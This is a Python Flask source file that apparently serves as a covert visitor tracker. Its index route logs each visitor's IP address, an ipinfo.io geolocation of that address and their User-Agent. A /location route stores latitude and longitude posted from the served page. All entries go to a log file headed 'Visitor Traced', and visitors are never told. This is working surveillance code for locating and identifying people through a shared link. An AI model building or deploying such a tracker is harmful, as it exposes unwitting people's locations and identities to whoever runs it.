from flask import Flask, request, send_file
import requests, os
from datetime import datetime

app = Flask(__name__)
LOG_FILE = "logs.txt"

def log_visitor(ip, location, user_agent, lat=None, lon=None):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    log_lines = [
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━",
        "🕵️‍♂️ Visitor Traced",
        f"📍 IP Address     : {ip}",
        f"🌐 Location       : {location}",
        f"📌 Coordinates    : {lat},{lon}" if lat and lon else "📌 Coordinates    : Not shared",
        f"🖥️ User-Agent     : {user_agent}",
        f"📅 Timestamp      : {timestamp}",
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
    ]
    with open(LOG_FILE, "a", encoding="utf-8") as f:
        f.write("\n".join(log_lines))

@app.route("/")
def index():
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    try:
        geo = requests.get(f"https://ipinfo.io/{ip}/json").json()
        location = f"{geo.get('city','Unknown')}, {geo.get('country','Unknown')} ({geo.get('loc','Unknown')})"
    except:
        location = "Unknown"
    user_agent = request.headers.get('User-Agent', 'Unknown')
    log_visitor(ip, location, user_agent)
    return send_file("index.html")

@app.route("/location", methods=["POST"])
def get_location():
    lat = request.form.get("lat")
    lon = request.form.get("lon")
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    user_agent = request.headers.get('User-Agent', 'Unknown')
    location = f"Lat: {lat}, Lon: {lon}"
    log_visitor(ip, location, user_agent, lat, lon)
    return "Location logged!"

if not os.path.exists(LOG_FILE):
    open(LOG_FILE, "w").close()

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
